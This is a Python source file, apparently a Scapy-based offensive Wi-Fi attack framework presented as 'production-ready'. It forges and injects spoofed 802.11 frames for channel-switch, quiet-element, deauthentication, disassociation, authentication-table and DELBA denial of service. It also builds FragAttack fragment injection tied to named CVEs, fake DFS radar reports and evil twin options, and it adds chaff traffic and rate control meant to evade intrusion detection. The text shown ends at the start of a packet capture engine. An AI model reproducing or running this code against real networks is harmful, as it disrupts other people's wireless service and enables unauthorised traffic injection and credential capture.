#!/usr/bin/env python3
"""
Veritas Edition v3.1 — CSA Nebula Attack Framework
Fully patched and production-ready.

All fatal bugs fixed:
  [FIX 1]  Dot11Elt(len=X) removed — Scapy computes len automatically
  [FIX 2]  Dot11EltCSA class used instead of manual struct.pack CSA
  [FIX 3]  Channel validation for 5GHz (>255 now raises clear error)
  [FIX 4]  sendp() with monitor=True for Linux kernel >=5.11
  [FIX 5]  Indentation fixed: _inject_loop and stop inside class
  [FIX 6]  Epsilon guard in RateController against zero-division
  [FIX 7]  auth_algo field detection at runtime for Scapy cross-version
  [FIX 8]  SSID non-ASCII encoding with .encode('ascii','replace')
  [FIX 9]  Dot11Elt info passed as bytes, not str
  [FIX 10] Quiet element uses correct 6-byte body without len= parameter
  [FIX 11] Script mode with JSON config support
  [FIX 12] Real-time stats JSON output
  [FIX 15] Configurable refresh rate
"""

import sys
import os
import struct
import time
import subprocess
import signal
import re
import random
import shutil
import json
import tempfile
import csv
import glob
import socket
import threading
import hashlib
import binascii
from threading import Thread, Event, Lock, Semaphore
from collections import deque, defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional, List, Dict, Tuple, Callable

# [FIX 1] Scapy imports at module level with conditional try/except
try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
        Dot11Disas, Dot11ProbeResp, Dot11Auth,
        LLC, SNAP, EAPOL, Raw, RandString,
        sendp, sniff,
    )
    # [FIX 2] Dot11EltCSA tersedia di Scapy >=2.6
    from scapy.layers.dot11 import Dot11EltCSA
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def strip_ansi(text: str) -> str:
    """Strip ANSI escape codes from text for correct length calculation."""
    return re.sub(r'\033\[[0-9;]*m', '', str(text))

# ============================================================
#               COLOR SYSTEM - QUANTUM BLUE SPECTRUM
# ============================================================

class C:
    """Quantum Blue Color System - 256-color enhanced"""
    RESET    = '\033[0m'
    BOLD     = '\033[1m'
    DIM      = '\033[2m'
    ITALIC   = '\033[3m'
    UNDERLN  = '\033[4m'
    BLINK    = '\033[5m' 
    REVERSE  = '\033[7m'
    HIDE     = '\033[8m'
    STRIKE   = '\033[9m'
    
    BLACK    = '\033[38;5;16m'
    NAVY     = '\033[38;5;17m'
    DEEP_B   = '\033[38;5;18m'
    MID_B    = '\033[38;5;19m'
    BLUE     = '\033[38;5;20m'
    TRUE_B   = '\033[38;5;21m'
    
    ROYAL    = '\033[38;5;27m'
    SKY      = '\033[38;5;33m'
    LIGHT_B  = '\033[38;5;39m'
    CYAN     = '\033[38;5;45m'
    AQUA     = '\033[38;5;51m'
    
    ICE      = '\033[38;5;87m'
    WHITE_B  = '\033[38;5;117m'
    GLACIER  = '\033[38;5;123m'
    ELECTRIC = '\033[38;5;81m'
    NEON     = '\033[38;5;39m'
    
    PURPLE   = '\033[38;5;99m'
    VIOLET   = '\033[38;5;105m'
    MAGENTA  = '\033[38;5;129m'
    ULTRA    = '\033[38;5;141m'
    
    SUCCESS  = '\033[38;5;51m'
    WARN     = '\033[38;5;81m'
    ERROR    = '\033[38;5;45m'
    INFO     = '\033[38;5;117m'
    CRITICAL = '\033[38;5;196m'
    
    WHITE    = '\033[38;5;255m'
    GRAY     = '\033[38;5;244m'
    DIM_GRAY = '\033[38;5;236m'
    LGRAY    = '\033[38;5;250m'
    SILVER   = '\033[38;5;248m'
    
    GREEN    = '\033[38;5;83m'
    GREEN_D  = '\033[38;5;76m'
    YELLOW   = '\033[38;5;226m'
    ORANGE   = '\033[38;5;208m'
    RED      = '\033[38;5;196m'
    PINK     = '\033[38;5;200m'
    GOLD     = '\033[38;5;220m'
    
    BG_DEEP  = '\033[48;5;17m'
    BG_MID   = '\033[48;5;18m'
    BG_BLUE  = '\033[48;5;19m'
    BG_DARK  = '\033[48;5;232m'
    BG_GLOW  = '\033[48;5;21m'
    BG_RED   = '\033[48;5;52m'
    BG_GREEN = '\033[48;5;22m'
    BG_GOLD  = '\033[48;5;58m'

R = C.RESET
B = C.BOLD

SYM = type('SYM', (), {
    'BOLT': f"{C.CYAN}⚡{R}",
    'CHECK': f"{C.AQUA}◆{R}",
    'CROSS': f"{C.RED}◇{R}",
    'ARROW': f"{C.ELECTRIC}▸{R}",
    'TARGET': f"{C.LIGHT_B}◎{R}",
    'DOT': f"{C.ICE}●{R}",
    'STAR': f"{C.WHITE_B}✦{R}",
    'RADAR': f"{C.CYAN}📡{R}",
    'LOCK': f"{C.AQUA}🔒{R}",
    'SKULL': f"{C.RED}💀{R}",
    'SHIELD': f"{C.AQUA}🛡{R}",
    'WAVE': f"{C.ELECTRIC}〰{R}",
    'GEAR': f"{C.CYAN}⚙{R}",
    'FLAME': f"{C.ORANGE}🔥{R}",
    'EYE': f"{C.AQUA}👁{R}",
    'NODE': f"{C.PURPLE}⬡{R}",
    'CUBE': f"{C.ICE}◈{R}",
    'OCT': f"{C.ELECTRIC}⎔{R}",
    'DIA': f"{C.WHITE_B}◇{R}",
    'HEX': f"{C.CYAN}⬡{R}",
    'HASH': f"{C.AQUA}#{R}",
    'LAMBDA': f"{C.PURPLE}λ{R}",
    'SIGMA': f"{C.ICE}Σ{R}",
    'PHI': f"{C.WHITE_B}φ{R}",
    'INF': f"{C.ELECTRIC}∞{R}",
    'BETA': f"{C.AQUA}β{R}",
    'ALPHA': f"{C.ICE}α{R}",
})

SPINNER = [
    f"{C.NAVY}◴{R}", f"{C.DEEP_B}◷{R}", f"{C.MID_B}◶{R}",
    f"{C.TRUE_B}◵{R}", f"{C.ROYAL}◴{R}", f"{C.SKY}◷{R}",
    f"{C.LIGHT_B}◶{R}", f"{C.CYAN}◵{R}", f"{C.AQUA}◴{R}",
    f"{C.ICE}◷{R}", f"{C.WHITE_B}◶{R}", f"{C.GLACIER}◵{R}",
    f"{C.ELECTRIC}◴{R}", f"{C.GLACIER}◷{R}", f"{C.WHITE_B}◶{R}",
    f"{C.ICE}◵{R}",
]

PULSE = [
    f"{C.NAVY}▓{R}", f"{C.DEEP_B}▓{R}", f"{C.MID_B}▓{R}", f"{C.TRUE_B}▓{R}",
    f"{C.ROYAL}▓{R}", f"{C.SKY}▓{R}", f"{C.LIGHT_B}▓{R}", f"{C.CYAN}▓{R}",
    f"{C.AQUA}▓{R}", f"{C.ICE}▓{R}", f"{C.WHITE_B}▓{R}", f"{C.GLACIER}▓{R}",
    f"{C.ELECTRIC}▓{R}", f"{C.GLACIER}▓{R}", f"{C.WHITE_B}▓{R}", f"{C.ICE}▓{R}",
    f"{C.AQUA}▓{R}", f"{C.CYAN}▓{R}", f"{C.LIGHT_B}▓{R}", f"{C.SKY}▓{R}",
    f"{C.ROYAL}▓{R}", f"{C.TRUE_B}▓{R}", f"{C.MID_B}▓{R}", f"{C.DEEP_B}▓{R}",
]

BANNER = f"""
{C.DEEP_B}{B}   ╔══════════════════════════════════════════════════════════════╗{R}
{C.MID_B}{B}   ║    ██╗   ██╗███████╗██████╗ ██╗████████╗ █████╗ ███████╗     ║{R}
{C.TRUE_B}{B}   ║    ██║   ██║██╔════╝██╔══██╗██║╚══██╔══╝██╔══██╗██╔════╝     ║{R}
{C.ROYAL}{B}   ║    ██║   ██║█████╗  ██████╔╝██║   ██║   ███████║███████╗     ║{R}
{C.SKY}{B}   ║    ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║   ██║   ██╔══██║╚════██║     ║{R}
{C.LIGHT_B}{B}   ║     ╚████╔╝ ███████╗██║  ██║██║   ██║   ██║  ██║███████║     ║{R}
{C.CYAN}{B}   ║      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝     ║{R}
{C.DEEP_B}{B}   ╠══════════════════════════════════════════════════════════════╣{R}
{C.ICE}{B}   ║           V E R I T A S   E D I T I O N   v 3 . 1            ║{R}
{C.ELECTRIC}{B}   ║                        Penulis mrc4t                         ║{R}
{C.DEEP_B}{B}   ╚══════════════════════════════════════════════════════════════╝{R}
"""

# ============================================================
#               CONFIGURATION & CONSTANTS
# ============================================================

VERSION = "3.1.0"
CONFIG_FILE = "/tmp/csa_nebula_config.json"

DEAUTH_REASONS = {
    1: "Unspecified",
    2: "Previous auth no longer valid",
    3: "STA leaving BSS (Deauth)",
    4: "Disassociated due to inactivity",
    5: "AP unable to handle all assoc STAs",
    6: "Class 2 frame from nonauth STA",
    7: "Class 3 frame from nonassoc STA",
    8: "STA leaving BSS (Disassoc)",
    9: "STA not auth'd",
    17: "QoS STA leaving BSS",
    23: "QoS STA was not authorized",
}

CHANNEL_2GHZ = list(range(1, 15))
CHANNEL_5GHZ = list(range(36, 166, 4))
ALL_CHANNELS = CHANNEL_2GHZ + CHANNEL_5GHZ

QUIET_MAX_DURATION = 65535

class AttackState:
    def __init__(self):
        self.stop_event = Event()
        self.lock = Lock()
        self.packets_sent = 0
        self.packets_fail = 0
        self.start_time = 0
        self.targets = []
        self.active_interfaces = []
        self.session_log = None
        self.current_channel = {}
        self.detection_counter = 0
        self.ids_bypass_mode = False
    
    def increment_sent(self, n=1):
        with self.lock:
            self.packets_sent += n
    
    def increment_fail(self, n=1):
        with self.lock:
            self.packets_fail += n
    
    def get_stats(self):
        with self.lock:
            return self.packets_sent, self.packets_fail

state = AttackState()


# ============================================================
#               ENUMS & DATA CLASSES
# ============================================================

class AttackVector(Enum):
    CSA_BEACON = "CSA Beacon Flood"
    QUIET_ELEMENT = "Quiet Element DoS"
    DEAUTH_FLOOD = "Deauth Flood"
    DISASSOC_FLOOD = "Disassoc Flood"
    EAPOL_LOGOFF = "EAPOL Logoff"
    PMKID_CAPTURE = "PMKID Capture"
    AUTH_DOS = "Auth Table DoS"
    CSA_ACTION = "CSA Action Frame"
    BEACON_CONFUSION = "Beacon Confusion"
    PROBE_RESPONSE_CSA = "Probe Response CSA"
    DELBA_ATTACK = "DELBA Attack"
    EVIL_TWIN = "Evil Twin Handoff"
    TKIP_MIC = "TKIP/GCMP MIC Error"
    POWER_SAVE = "Power Save DoS"
    FRAGATTACK = "FragAttack Injection"
    DFS_FAKE_RADAR = "Operating Channel Aggression"

class AttackMode(Enum):
    STEALTH = 1
    LOW = 2
    MEDIUM = 3
    HIGH = 4
    INSANE = 5

@dataclass
class TargetAP:
    bssid: str
    ssid: str
    channel: int
    encryption: str = ""
    power: int = 0
    vendor: str = ""
    clients: List[str] = field(default_factory=list)
    
    def __hash__(self):
        return hash(self.bssid)

@dataclass
class AttackConfig:
    vectors: List[AttackVector]
    mode: AttackMode = AttackMode.MEDIUM
    iface_primary: str = ""
    iface_secondary: str = ""
    duration: int = 0
    new_channel: int = 1
    client_mac: str = "ff:ff:ff:ff:ff:ff"
    use_rotation: bool = False
    use_dual_radio: bool = False
    ids_bypass: bool = False
    log_pmkid: bool = False
    spawn_rogue: bool = False
    rogue_ssid: str = ""
    
    def get_params(self):
        params = {
            AttackMode.STEALTH: {"count": 2, "inter": 0.15, "sleep": 0.5, "burst": 1},
            AttackMode.LOW: {"count": 3, "inter": 0.08, "sleep": 0.3, "burst": 2},
            AttackMode.MEDIUM: {"count": 5, "inter": 0.04, "sleep": 0.08, "burst": 5},
            AttackMode.HIGH: {"count": 10, "inter": 0.015, "sleep": 0.02, "burst": 10},
            AttackMode.INSANE: {"count": 1, "inter": 0.003, "sleep": 0.0, "burst": 25},
        }
        return params[self.mode]


# ============================================================
#               RADIOTAP ENGINE (vanhoef certified)
# ============================================================

def _ssid_bytes(ssid: str) -> bytes:
    """[FIX 8] Convert SSID to bytes safely, handling non-ASCII."""
    if isinstance(ssid, str):
        return ssid.encode('ascii', errors='replace')
    return ssid


def _validate_channel(ch: int) -> None:
    """[FIX 3] Validate channel number; raise on values that can't be encoded in 1 byte."""
    if not (1 <= ch <= 255):
        raise ValueError(
            f"Channel {ch} cannot be encoded in a single byte CSA element. "
            "Use channels 1-255 only."
        )


def _get_auth_field_name() -> str:
    """[FIX 7] Detect the correct field name for Dot11Auth algorithm at runtime."""
    field_names = [f.name for f in Dot11Auth.fields_desc]
    if 'auth_algo' in field_names:
        return 'auth_algo'
    elif 'algo' in field_names:
        return 'algo'
    return 'algo'  # Default fallback


AUTH_FIELD_NAME = _get_auth_field_name()


class RadioTapEngine:
    """High-reliability RadioTap injection layer.
    
    Uses the vanhoef-tested TXFlags (NOSEQ+ORDER) for correct frame injection.
    Reference: https://github.com/vanhoefm/wifi-injection
    """
    
    @staticmethod
    def make_radiotap():
        """Create RadioTap with TXFlags for reliable injection."""
        return RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")
    
    @staticmethod
    def make_beacon(radiotap, bssid, ssid, new_ch, chan_width=20):
        """Build CSA beacon using Dot11EltCSA built-in class (Scapy >=2.6).
        
        [FIX 2] Uses Dot11EltCSA instead of manual Dot11Elt(ID=37, ...) + struct.pack.
        [FIX 3] Validates channel before building.
        [FIX 8] SSID encoded to bytes safely.
        """
        _validate_channel(new_ch)
        ssid_b = _ssid_bytes(ssid)
        
        pkt = (radiotap / 
               Dot11(type=0, subtype=8,
                     addr1="ff:ff:ff:ff:ff:ff",
                     addr2=bssid, addr3=bssid) /
               Dot11Beacon(cap="ESS+privacy") /
               Dot11Elt(ID="SSID", info=ssid_b) /
               Dot11EltCSA(new_channel=new_ch, channel_switch_count=0))
        
        return pkt
    
    @staticmethod
    def make_quiet_beacon(radiotap, bssid, ssid, quiet_dur=65535):
        """Build beacon with Quiet element (802.11h DFS).
        
        [FIX 10] No len= parameter in Dot11Elt — Scapy infers from info length.
        [FIX 8]  SSID encoded to bytes safely.
        """
        # Quiet element body: Count(1) + Period(1) + Duration(2) + Offset(2) = 6 bytes
        quiet_info = struct.pack('<BBHH', 0, 0, quiet_dur, 0)
        ssid_b = _ssid_bytes(ssid)
        
        pkt = (radiotap /
               Dot11(type=0, subtype=8,
                     addr1="ff:ff:ff:ff:ff:ff",
                     addr2=bssid, addr3=bssid) /
               Dot11Beacon(cap="ESS+privacy") /
               Dot11Elt(ID="SSID", info=ssid_b) /
               Dot11Elt(ID=39, info=quiet_info))
        
        return pkt
    
    @staticmethod
    def make_deauth(radiotap, bssid, client="ff:ff:ff:ff:ff:ff", reason=7):
        """Build deauth frame with randomized sequence."""
        seq = random.randint(1, 4095)
        pkt = (radiotap /
               Dot11(type=0, subtype=12, SC=seq << 4,
                     addr1=client, addr2=bssid, addr3=bssid) /
               Dot11Deauth(reason=reason))
        return pkt
    
    @staticmethod
    def make_disassoc(radiotap, bssid, client="ff:ff:ff:ff:ff:ff", reason=8):
        """Build disassociation frame."""
        seq = random.randint(1, 4095)
        pkt = (radiotap /
               Dot11(type=0, subtype=10, SC=seq << 4,
                     addr1=client, addr2=bssid, addr3=bssid) /
               Dot11Disas(reason=reason))
        return pkt
    
    @staticmethod
    def make_eapol_logoff(radiotap, bssid, client):
        """Build EAPOL-Logoff frame (vanhoef technique)."""
        pkt = (radiotap /
               Dot11(type=2, subtype=0,
                     addr1=bssid, addr2=client, addr3=bssid) /
               LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
               SNAP(OUI=0, code=0x888E) /
               EAPOL(version=1, type=2, len=0))
        return pkt
    
    @staticmethod
    def make_csa_action(radiotap, bssid, client, new_ch):
        """Build directed CSA Action frame (IEEE 802.11h)."""
        _validate_channel(new_ch)
        category = 0
        action_code = 5
        switch_mode = 1
        switch_count = 1
        
        csa_body = struct.pack('BBBBB', category, action_code,
                                switch_mode, new_ch, switch_count)
        
        pkt = (radiotap /
               Dot11(type=0, subtype=13,
                     addr1=client, addr2=bssid, addr3=bssid) /
               Raw(csa_body))
        return pkt
    
    @staticmethod
    def make_probe_response_csa(radiotap, bssid, ssid, new_ch):
        """Build Probe Response containing CSA element (instant switch).
        
        [FIX 2] Uses Dot11EltCSA instead of manual struct.pack.
        [FIX 3] Validates channel.
        [FIX 8] SSID encoded to bytes.
        """
        _validate_channel(new_ch)
        ssid_b = _ssid_bytes(ssid)
        
        pkt = (radiotap /
               Dot11(type=0, subtype=5,
                     addr1="ff:ff:ff:ff:ff:ff",
                     addr2=bssid, addr3=bssid) /
               Dot11ProbeResp() /
               Dot11Elt(ID="SSID", info=ssid_b) /
               Dot11EltCSA(new_channel=new_ch, channel_switch_count=0))
        return pkt

    @staticmethod
    def make_auth_frame(radiotap, bssid, client, seq_num=1):
        """Build authentication frame for auth table DoS.
        
        [FIX 7] Uses detected field name ('auth_algo' or 'algo') at runtime.
        """
        # Build the auth layer with the correct field name
        kwargs = {'seqnum': seq_num, 'status': 0}
        kwargs[AUTH_FIELD_NAME] = 0
        
        pkt = (radiotap /
               Dot11(type=0, subtype=11,
                     addr1=bssid, addr2=client, addr3=bssid) /
               Dot11Auth(**kwargs))
        return pkt
    
    @staticmethod
    def make_delba(radiotap, bssid, client):
        """Build DELBA (Delete Block ACK) action frame."""
        category = 3
        action_code = 2
        initiator = 0
        tid = 0
        delba_body = struct.pack('<BBHH', category, action_code,
                                   (initiator << 11) | (tid << 12), 0)
        
        pkt = (radiotap /
               Dot11(type=0, subtype=13,
                     addr1=client, addr2=bssid, addr3=bssid) /
               Raw(delba_body))
        return pkt

    @staticmethod
    def make_frag_setup(radiotap, bssid, client, seq_num=42):
        """Build FragAttack Fragment 0 (MoreFragments=1).

        Creates a fragmented data frame with LLC/SNAP header declaring IPv4
        and a partial ARP request payload. Fragment 1 completes the injection.

        Reference: Mathy Vanhoef, 'Fragment and Forge' (USENIX 2021)
        CVE-2020-24588 / CVE-2020-26145
        """
        # SC: seq_num in upper 12 bits, frag_num=0 in lower 4 bits
        sc = (seq_num & 0x0FFF) << 4 | 0  # fragment 0

        # Partial ARP request payload (first 14 bytes)
        client_bytes = bytes.fromhex(client.replace(':', ''))
        arp_partial = struct.pack('!HHBBH',
            0x0001,  # Hardware type: Ethernet
            0x0800,  # Protocol type: IPv4
            6,       # HW addr length
            4,       # Proto addr length
            0x0001,  # Opcode: Request
        ) + client_bytes  # Sender hardware address

        pkt = (radiotap /
               Dot11(type=2, subtype=0,
                     FCfield=0x05,  # ToDS + MoreFragments
                     addr1=bssid, addr2=client, addr3=bssid,
                     SC=sc) /
               LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
               SNAP(OUI=0, code=0x0800) /
               Raw(arp_partial))
        return pkt

    @staticmethod
    def make_frag_payload(radiotap, bssid, client, seq_num=42, payload=None):
        """Build FragAttack Fragment 1 (final fragment, MoreFragments=0).

        Carries the injected payload that completes the reassembled frame.
        When stitched with Fragment 0 in the victim's RAM, forms a valid
        IPv4 frame with injected content — without knowing the Wi-Fi password.
        """
        # Same seq_num as Fragment 0, but frag_num=1
        sc = (seq_num & 0x0FFF) << 4 | 1  # fragment 1

        if payload is None:
            # Default: ARP completion + ICMP echo probe
            payload = (
                b'\xC0\xA8\x01\x64'            # Sender IP: 192.168.1.100
                b'\xFF\xFF\xFF\xFF\xFF\xFF'      # Target HW: broadcast
                b'\xC0\xA8\x01\x01'             # Target IP: 192.168.1.1 (gw)
                # ICMP Echo Request marker
                b'\x45\x00\x00\x1C'             # IPv4 ver/IHL, 28 bytes
                b'\x00\x00\x40\x00'             # Don't Fragment
                b'\x40\x01\x00\x00'             # TTL=64, Proto=ICMP
                b'\xC0\xA8\x01\x64'             # Src IP
                b'\xC0\xA8\x01\x01'             # Dst IP
                b'\x08\x00\x00\x00'             # ICMP Echo, Code 0
                b'\xDE\xAD\xBE\xEF'             # Identifier + Seq marker
            )

        pkt = (radiotap /
               Dot11(type=2, subtype=0,
                     FCfield=0x01,  # ToDS only (no MoreFrag)
                     addr1=bssid, addr2=client, addr3=bssid,
                     SC=sc) /
               Raw(payload))
        return pkt

    @staticmethod
    def make_dfs_radar_report(radiotap, bssid, client, cur_ch):
        """Build Spectrum Management Measurement Report with Radar bit set.

        Operating Channel Aggression (DFS Fake Radar) — packet 1/2.
        Spoofs a client→AP Basic Report claiming radar on cur_ch
        (IEEE 802.11-2020 §9.4.2.22, Map bit3 = Radar).
        """
        # Category=0 Spectrum Mgmt, Action=1 Measurement Report, Dialog=1
        body = struct.pack('BBB', 0, 1, 1)
        # Measurement Report IE (ID=39, len=15): Basic Report + Radar map
        body += struct.pack('BBBBB', 39, 15, 1, 0, 0)  # ID, len, token, mode, type
        body += struct.pack('B', cur_ch & 0xFF)
        body += struct.pack('<Q', int(time.time() * 1e6) & 0xFFFFFFFFFFFFFFFF)
        body += struct.pack('<H', 50)  # duration TU
        body += struct.pack('B', 0x08)  # Map: Radar detected

        pkt = (radiotap /
               Dot11(type=0, subtype=13,
                     addr1=bssid, addr2=client, addr3=bssid) /
               Raw(body))
        return pkt

    @staticmethod
    def make_dfs_vacate_csa(radiotap, bssid, ssid, cur_ch, safe_ch):
        """Build spoofed AP CSA beacon forcing immediate channel vacation.

        Operating Channel Aggression (DFS Fake Radar) — packet 2/2.
        Simulates the AP's mandatory DFS response: stop TX + switch.
        """
        _validate_channel(safe_ch)
        ssid_b = _ssid_bytes(ssid)
        pkt = (radiotap /
               Dot11(type=0, subtype=8,
                     addr1="ff:ff:ff:ff:ff:ff",
                     addr2=bssid, addr3=bssid) /
               Dot11Beacon(cap="ESS+privacy") /
               Dot11Elt(ID="SSID", info=ssid_b) /
               Dot11Elt(ID="DSset", info=bytes([cur_ch & 0xFF])) /
               Dot11EltCSA(mode=1, new_channel=safe_ch, channel_switch_count=0))
        return pkt


# ============================================================
#               PACKET FACTORY
# ============================================================

class PacketFactory:
    """Pre-builds all packet types for zero-latency injection."""
    
    def __init__(self, config: AttackConfig, target: TargetAP,
                 new_ch: int, client_mac: str):
        self.config = config
        self.target = target
        self.new_ch = new_ch
        self.client_mac = client_mac
        self.rt = RadioTapEngine.make_radiotap()
        self._build_cache()
    
    def _build_cache(self):
        """Pre-build all packet variants."""
        t = self.target
        nch = self.new_ch
        cm = self.client_mac
        rt = self.rt
        
        self.csa_beacon = RadioTapEngine.make_beacon(rt, t.bssid, t.ssid, nch)
        self.quiet_beacon = RadioTapEngine.make_quiet_beacon(rt, t.bssid, t.ssid)
        
        self.deauth_packets = {}
        for reason in [1, 3, 4, 6, 7, 8, 17, 23]:
            self.deauth_packets[reason] = RadioTapEngine.make_deauth(
                rt, t.bssid, cm, reason)
        
        self.deauth_broadcast = RadioTapEngine.make_deauth(rt, t.bssid)
        
        self.disassoc = RadioTapEngine.make_disassoc(rt, t.bssid, cm)
        self.disassoc_broadcast = RadioTapEngine.make_disassoc(rt, t.bssid)
        
        self.csa_action = RadioTapEngine.make_csa_action(rt, t.bssid, cm, nch)
        self.probe_response = RadioTapEngine.make_probe_response_csa(
            rt, t.bssid, t.ssid, nch)
        
        self.eapol_logoff = RadioTapEngine.make_eapol_logoff(rt, t.bssid, cm)
        
        self.delba = RadioTapEngine.make_delba(rt, t.bssid, cm)
        
        self.confusion_beacon = self._make_confusion_beacon()
        
        self.auth_pool = []
        for _ in range(10):
            fake_mac = self._rand_mac()
            self.auth_pool.append(RadioTapEngine.make_auth_frame(
                rt, t.bssid, fake_mac))
        
        # FragAttack: paired fragments for plaintext injection
        frag_seq = 42  # shared sequence number for fragment pairing
        self.frag_setup = RadioTapEngine.make_frag_setup(
            rt, t.bssid, cm, seq_num=frag_seq)
        self.frag_payload = RadioTapEngine.make_frag_payload(
            rt, t.bssid, cm, seq_num=frag_seq)

        # DFS Fake Radar (Operating Channel Aggression): radar report + vacate CSA
        cur_ch = t.channel & 0xFF
        dfs_ch = {52, 56, 60, 64} | set(range(100, 145))
        safe_ch = nch if (1 <= nch <= 165 and nch not in dfs_ch) else (36 if cur_ch >= 36 else 1)
        self.dfs_radar_report = RadioTapEngine.make_dfs_radar_report(
            rt, t.bssid, cm, cur_ch)
        self.dfs_vacate_csa = RadioTapEngine.make_dfs_vacate_csa(
            rt, t.bssid, t.ssid, cur_ch, safe_ch)

        self.chaff_packets = []
        for _ in range(5):
            self.chaff_packets.append(self._make_chaff())
    
    def _make_confusion_beacon(self):
        fake_bssid = self._rand_mac()
        ssid_b = _ssid_bytes(self.target.ssid)
        return (self.rt /
                Dot11(type=0, subtype=8,
                      addr1="ff:ff:ff:ff:ff:ff",
                      addr2=fake_bssid, addr3=fake_bssid) /
                Dot11Beacon(cap="ESS+privacy") /
                Dot11Elt(ID="SSID", info=ssid_b))
    
    def _make_chaff(self):
        fake_src = self._rand_mac()
        fake_dst = self._rand_mac()
        return (self.rt /
                Dot11(type=2, subtype=0,
                      addr1=fake_dst, addr2=fake_src,
                      addr3=self._rand_mac(),
                      SC=random.randint(1, 4095) << 4) /
                Raw(RandString(random.randint(50, 200))))
    
    def _rand_mac(self):
        return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
    
    def get(self, vector: AttackVector):
        mapping = {
            AttackVector.CSA_BEACON: [self.csa_beacon],
            AttackVector.QUIET_ELEMENT: [self.quiet_beacon],
            AttackVector.DEAUTH_FLOOD: list(self.deauth_packets.values()),
            AttackVector.DISASSOC_FLOOD: [self.disassoc, self.disassoc_broadcast],
            AttackVector.EAPOL_LOGOFF: [self.eapol_logoff],
            AttackVector.CSA_ACTION: [self.csa_action],
            AttackVector.BEACON_CONFUSION: [self.confusion_beacon],
            AttackVector.PROBE_RESPONSE_CSA: [self.probe_response],
            AttackVector.DELBA_ATTACK: [self.delba],
            AttackVector.AUTH_DOS: self.auth_pool,
            AttackVector.FRAGATTACK: [self.frag_setup, self.frag_payload],
            AttackVector.DFS_FAKE_RADAR: [self.dfs_radar_report, self.dfs_vacate_csa],
        }
        return mapping.get(vector, [self.csa_beacon])


# ============================================================
#               INJECTION ENGINE
# ============================================================

class InjectionEngine:
    """High-performance packet injection engine with adaptive rate control."""
    
    def __init__(self, config: AttackConfig, factory: PacketFactory):
        self.config = config
        self.factory = factory
        self.params = config.get_params()
        self.injection_threads = []
        self.rate_controller = RateController(config.mode)
    
    def start(self):
        """Start all injection threads based on selected vectors."""
        for vec in self.config.vectors:
            packets = self.factory.get(vec)
            if not packets:
                continue
            
            t = Thread(target=self._inject_loop,
                       args=(vec, packets), daemon=True)
            t.start()
            self.injection_threads.append(t)
            
            if self.config.use_dual_radio and self.config.iface_secondary:
                t2 = Thread(target=self._inject_loop,
                            args=(vec, packets, self.config.iface_secondary),
                            daemon=True)
                t2.start()
                self.injection_threads.append(t2)
    
    # [FIX 5] Indentasi benar — method di dalam class
    def _inject_loop(self, vector: AttackVector, packets: list,
                     iface_override=None):
        """Core injection loop with burst injection.
        
        [FIX 4] Uses monitor=True for Linux kernel >=5.11.
        """
        iface = iface_override or self.config.iface_primary
        
        pkt_idx = 0
        burst_size = random.randint(5, 10)
        
        while not state.stop_event.is_set():
            for _ in range(burst_size):
                pkt = packets[pkt_idx % len(packets)]
                pkt_idx += 1
                
                try:
                    # [FIX 4] monitor=True untuk kernel >=5.11
                    sendp(pkt, iface=iface, count=1, inter=0,
                          verbose=False, monitor=True)
                    state.increment_sent(1)
                except Exception:
                    state.increment_fail()
                
                if self.config.ids_bypass:
                    time.sleep(random.uniform(0.0005, 0.002))
            
            sleep_time = self.rate_controller.get_sleep()
            if sleep_time > 0:
                time.sleep(sleep_time)
            
            burst_size = random.randint(5, 10)
    
    def stop(self):
        """Stop all injection threads."""
        state.stop_event.set()


class RateController:
    """Adaptive rate control to avoid IDS detection and interface saturation.
    
    [FIX 6] Epsilon guard prevents zero-division.
    """
    
    def __init__(self, mode: AttackMode):
        self.mode = mode
        self.window = deque(maxlen=50)
        self.target_rates = {
            AttackMode.STEALTH: 20,
            AttackMode.LOW: 50,
            AttackMode.MEDIUM: 200,
            AttackMode.HIGH: 500,
            AttackMode.INSANE: 2000,
        }
        self.throttle_factor = 1.0
    
    def get_sleep(self):
        """Calculate adaptive sleep time.
        
        [FIX 6] Epsilon check prevents division by zero when elapsed < 0.01.
        """
        sent, _ = state.get_stats()
        elapsed = time.time() - state.start_time
        
        if elapsed < 0.01:
            return {
                AttackMode.STEALTH: 0.5,
                AttackMode.LOW: 0.3,
                AttackMode.MEDIUM: 0.1,
                AttackMode.HIGH: 0.02,
                AttackMode.INSANE: 0.001,
            }[self.mode]
        
        current_rate = sent / elapsed
        target = self.target_rates[self.mode]
        
        ratio = current_rate / target if target > 0 else 1
        if ratio > 1.5:
            self.throttle_factor = min(5.0, self.throttle_factor * 1.1)
        elif ratio < 0.5:
            self.throttle_factor = max(0.5, self.throttle_factor * 0.9)
        
        base_sleep = {
            AttackMode.STEALTH: 0.5,
            AttackMode.LOW: 0.3,
            AttackMode.MEDIUM: 0.1,
            AttackMode.HIGH: 0.02,
            AttackMode.INSANE: 0.001,
        }[self.mode]
        
        return base_sleep * self.throttle_factor


# ============================================================
#               CHANNEL HOPPER
# ============================================================

class ChannelHopper:
    """Intelligent channel hopping with target locking."""
    
    def __init__(self, config: AttackConfig, target: TargetAP):
        self.config = config
        self.target = target
        self.current_ifs = {}
    
    def start(self):
        t = Thread(target=self._hop_loop, daemon=True)
        t.start()
        return t
    
    def _hop_loop(self):
        ifaces = [self.config.iface_primary]
        if self.config.use_dual_radio and self.config.iface_secondary:
            ifaces.append(self.config.iface_secondary)
        
        while not state.stop_event.is_set():
            for iface in ifaces:
                try:
                    subprocess.run(
                        ["iw", "dev", iface, "set", "channel",
                         str(self.target.channel)],
                        capture_output=True, timeout=2
                    )
                    state.current_channel[iface] = self.target.channel
                except Exception:
                    pass
            time.sleep(1.5)


# ============================================================
#               SNIFFER / CAPTURE ENGINE
# ============================================================

class CaptureEngine:
    """Packet capture for PMKID, handshake, and client discovery."""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.captured_pmkids = []
        self.captured_handshakes = []
        self.discovered_clients = {}
        self.capture_running = False
    
    def start(self):
        t = Thread(target=self._capture_loop, daemon=True)
        t.start()
        return t
    
